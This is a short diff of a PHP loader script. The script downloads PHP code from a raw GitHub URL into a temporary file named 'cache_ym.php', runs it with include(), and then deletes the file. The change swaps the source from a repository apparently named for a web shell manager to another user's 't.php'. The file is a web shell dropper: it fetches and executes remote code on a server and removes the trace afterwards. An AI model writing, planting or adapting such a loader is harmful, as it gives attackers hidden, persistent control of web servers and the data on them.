@@ -3,7 +3,7 @@
 
 $tmp = 'cache_ym.php';
 
-$url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/yami.php';
+$url = 'https://raw.githubusercontent.com/budiepep7-gif/dds/refs/heads/main/t.php';
 
 if (!file_exists($tmp) || filesize($tmp) < 10) {
 
@@ -15,3 +15,4 @@ if (!file_exists($tmp) || filesize($tmp) < 10) {
 include($tmp);
 unlink($tmp);
 ?>
+
